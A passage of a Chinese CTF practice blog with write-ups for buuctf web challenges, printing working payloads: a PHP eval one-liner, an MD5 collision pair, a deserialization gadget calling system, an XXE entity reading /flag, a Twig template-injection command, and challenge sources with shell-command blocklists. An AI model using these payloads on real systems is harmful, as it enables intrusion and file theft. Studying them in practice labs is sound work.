<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(phpinfo()); <span class="comment">// 布尔true</span></span><br><span class="line">var_dump(strtolower(phpinfo()));<span class="comment">// 字符串&#x27;1&#x27;,phpinfo执行成功返回1，将1小写</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">//字符串&#x27;11&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line">这里的<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>执行后相当于 strtolower(<span class="string">&quot;<span class="subst">&#123;$&#123;1&#125;</span>&#125;&quot;</span>) 又相当于 strtolower(<span class="string">&quot;&#123;null&#125;&quot;</span>) 又相当于 <span class="string">&#x27;&#x27;</span> 空字符串</span><br></pre></td></tr></table></figure>

<p>接下来还有一个难点，就是正则匹配式中匹配语句该如何书写呢？：</p>
<table>
<thead>
<tr>
<th><code>.</code></th>
<th>匹配除换行符以外的任意字符</th>
</tr>
</thead>
<tbody><tr>
<td><code>\s</code></td>
<td>匹配任意的空白符</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的子表达式一次或多次</td>
</tr>
</tbody></table>
<p>但是这里无法使用. 因为php的解析特性，会被转义成_就改变来原来我们想要的效果，所以这里需要的是\S*<br>由于这里是eval函数执行，所以我们可以直接构造一句话木马：</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?\S*&#x3D;&#123;$&#123;eval($_POST[&#39;1&#39;])&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuctf7</title>
    <url>/2021/04/08/buuctf7/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>看到img的后面像base64，解密两次后再经过hex解密，得到一个文件名称，于是尝试读取index.php源码，<br>hex-&gt;base64-&gt;base64<a id="more"></a></p>
<p>抓包在cmd上做手脚，发现传入数组类型的时候，有回显array，这个时候总觉得有点函数嵌套那味了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>又是md5的事情，直接进了</p>
<p>md5碰撞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;&#x3D;</span><br></pre></td></tr></table></figure>

<p>在linux系统中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;flag</span><br><span class="line">ca\t &#x2F;fla\g 是等价的</span><br><span class="line">为什么等价呢？在linux系统中这个反斜线可以使命令换行，和我们之前的题目是一个意思啦。。。</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>页面一直在刷新，路径也知道了，先抓个包看看,发现可以提交表单，然后用了call_user_func这个危险函数：<br><strong>call_user_func — 把第一个参数作为回调函数调用</strong><br>使用file_get_contents查看index.php源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">        $func &#x3D; strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>果然在一条路上卡太久应该积极转化思路，当我苦苦搜素手册无果的时候，最终选择打开了wp，原来可以利用反序列化来解题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;cat $(find / -name flag*)&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br></pre></td></tr></table></figure>

<p>这里有一点需要说明的是，eval不是函数所以这里的call_user_func就不适用了，所以选择system来构造payload，不过这个拿到flag的语句也是让我眼前一亮</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="comment">#python这里应该指的就是使用的函数吧，按照这个逻辑下去，首先是action、然后是param。。。。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#在上面对赋值完成的内容传入Exec中进行执行</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="comment">#使用checkSign()，进行跟踪看看</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)<span class="comment">#真的读取点在这！</span></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#来到这里，使用getSign()函数，看看是否和self.sign=sign相等</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="comment">#万物的起点在这里！！！！！！</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="comment">#这里进行和秘钥的拼接后md5的加密传回值</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#万物的起点还有这里！！！！！！</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment">#这里是从cookie传回sign</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="comment">#有个waf</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#这里！！！！！！，以下就是我们的初始页面了</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="comment">#这里来个分割线</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]<span class="comment">#感觉这里可以读文件来着</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"><span class="comment">#对传入的内容也就是secert_key+param+action进行加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#来到md5进行加密，并返回值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>python代码审计:<br>在python2.7中跑，想说用debug了解一下整个代码的运行逻辑，但是跳来跳去的，实在看不明白，可能是由于都是由def的函数形式，所以打算去看看如何审计此类代码:<br>大概进程就是如上所示，接下来要考虑的就是漏洞在哪里，思路都写在上面了，现在传值看看：没有反应，密钥都没有我传个鬼–，学习了路由的知识后，发现其实不止index.php一个入口还有geneSign 还有De1ta入口，这里</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210409225007.png" alt="img"></p>
<p>根据提示，传入flag.txt查看到密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1ae9809211e47b0157b8ea5a0f0b8f55</span><br></pre></td></tr></table></figure>

<p>(这里不是很懂为啥能查看到密钥？也没有相关代码呀，是我看得不够仔细吗)，被wp给误导了，其实也不算误导，应该是我理解错了<br>这里重新理一下思路:其实这里主要绕过的就是一个checksign函数和一个waf函数<br>check函数需要比对的内容是将param和action以及密钥进行拼接，再与我们传入的sign进行比对，但是问题在于，我们没有密钥，所以解题的关键就在这里，我们知道flag在flag.txt文件中，而在genesign中 如果我们传入flag.txt那么返回的内容即为<br>secret_key+flag.txtscan的md5加密，但是后面的action只能是scan会不会有影响呢？其实不会的，因为这也是我们所需要的，进入到exec函数中，其实有两个判断，一个是read一个是scan，当我们在scan前加上read，那么判断就会进入read当中，即可使用read()函数打开flag.txt了<br>救命，终于有不一样的回显了！<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210409230213.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210410012646.png" alt="img" style="zoom:50%;">
最终payload]]></content>
  </entry>
  <entry>
    <title>buuctf8</title>
    <url>/2021/04/11/buuctf8/</url>
    <content><![CDATA[<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>学习完xml的语法以后，再去看一下xml实体注入的例子，感觉就理解的比较快了<a id="more"></a></p>
<p>其实就是在外部声明DTD实体，然后直接引用</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411154521.png" alt="img" style="zoom:67%;">

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  <span class="meta-keyword">chybeta</span>  <span class="meta-string">&quot;Hello World!&quot;</span>&gt;</span>    &lt;!--引用对象为chybeta--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  t  <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;t;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="comment">&lt;!--&lt;/username&gt;&lt;password&gt;ad&lt;/password&gt;&lt;/user&gt;--&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接读取flag</p>
<p>这里贴一下格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>针对xml注入可以学习:<a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</a></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>这题考的不是很明白，大致就是买独角兽，查看源码，在utf-8旁边有提示，说这个编码问题很重要然后买前三只的回显和最后一只不同，最后一只用一个字符买说钱不够，用多个字符 说只能使用一个字符，于是看看有没有一个字符表示的数字很大的:<br><a href="https://www.compart.com/en/unicode/U+137C">https://www.compart.com/en/unicode/U+137C</a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411161716.png" alt="img" style="zoom:67%;"></p>
<p>这个网址可以查询：最后将0x换成%就行。</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>像模板注入，于是尝试输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1*3&#125;&#125;&#x2F;&#x2F;回显为3</span><br></pre></td></tr></table></figure>

<p>但是输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;..&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不论输入什么字符都直接被过滤，看一下是什么模板再对症下药吧：验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1*&#39;3&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411164725.jpeg" alt="https://s2.ax1x.com/2020/01/28/1M1vsx.jpg" style="zoom:67%;">
发现是twig模板注入，其攻击语句又和淳朴的flask框架不同，构造方式:

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411165326.png" alt="img" style="zoom:67%;">

<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p><strong>PHP函数：</strong></p>
<p>scandir() 函数：返回指定目录中的文件和目录的数组。<br>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符(此时就可以执行命令！)。<br>var_dump() ：函数用于输出变量的相关信息。<br>readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。<br>语法：readfile(filename,include_path,context)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span 